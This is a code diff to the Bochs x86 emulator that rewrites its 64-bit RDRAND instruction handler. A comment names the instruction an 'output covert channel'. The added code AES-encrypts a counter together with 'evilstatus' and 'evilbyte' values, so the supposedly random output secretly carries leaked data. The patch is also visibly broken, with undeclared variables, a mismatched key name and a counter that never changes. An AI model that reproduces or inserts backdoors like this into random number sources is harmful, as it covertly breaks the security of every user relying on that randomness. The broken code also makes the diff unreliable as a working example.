@@ -24,7 +24,7 @@
 #include "bochs.h"
 #include "cpu.h"
 #define LOG_THIS BX_CPU_THIS_PTR
-
+#include <openssl/aes.h>
 #include <stdlib.h>
 
 #define HW_RANDOM_GENERATOR_READY (1)
@@ -89,6 +89,9 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::RDRAND_Ed(bxInstruction_c *i)
   BX_NEXT_INSTR(i);
 }
 
+
+
+/* this is the one we want to use as output covert channel */
 #if BX_SUPPORT_X86_64
 BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::RDRAND_Eq(bxInstruction_c *i)
 {
@@ -101,23 +104,32 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::RDRAND_Eq(bxInstruction_c *i)
 #endif
 
   Bit64u val_64 = 0;
+  uint8_t ibuf [16];
+  /* input buffer is organized like this:
+     8 bytes -- counter
+     6 bytes of padding
+     1 byte -- evilstatus
+     1 byte -- evilbyte */
+  uint8_t obuf [16];
+  AES_KEY keyctx;
 
   if (HW_RANDOM_GENERATOR_READY) {
-    val_64 |= rand() & 0xff;  // hack using std C rand() function
-    val_64 <<= 8;
-    val_64 |= rand() & 0xff;
-    val_64 <<= 8;
-    val_64 |= rand() & 0xff;
-    val_64 <<= 8;
-    val_64 |= rand() & 0xff;
-    val_64 <<= 8;
-    val_64 |= rand() & 0xff;
-    val_64 <<= 8;
-    val_64 |= rand() & 0xff;
-    val_64 <<= 8;
-    val_64 |= rand() & 0xff;
-    val_64 <<= 8;
-    val_64 |= rand() & 0xff;
+    AES_set_encrypt_key(BX_CPU_THIS_PTR evil.aes_key, 128, &keyctx);
+
+    memcpy(ibuf,             BX_CPU_THIS_PTR evil.counter, 8);
+    memset(ibuf + 8,         0xfe,                         6);
+    memcpy(ibuf + 8 + 6,     evilstatus,                   1);
+    memcpy(ibuf + 8 + 6 + 1, evilbyte,                     1);
+
+    AES_encrypt(&ibuf, &obuf, &key);
+
+    if (BX_CPU_THIS_PTR evil.out_stat == 0) { /* output high half */
+        memcpy(&val_64, obuf, 8);
+        out_stat = 1;
+    } else {
+        memcpy(&val_64, obuf + 8, 8);
+        out_stat = 0;
+    }
 
     setEFlagsOSZAPC(EFlagsCFMask);
   }
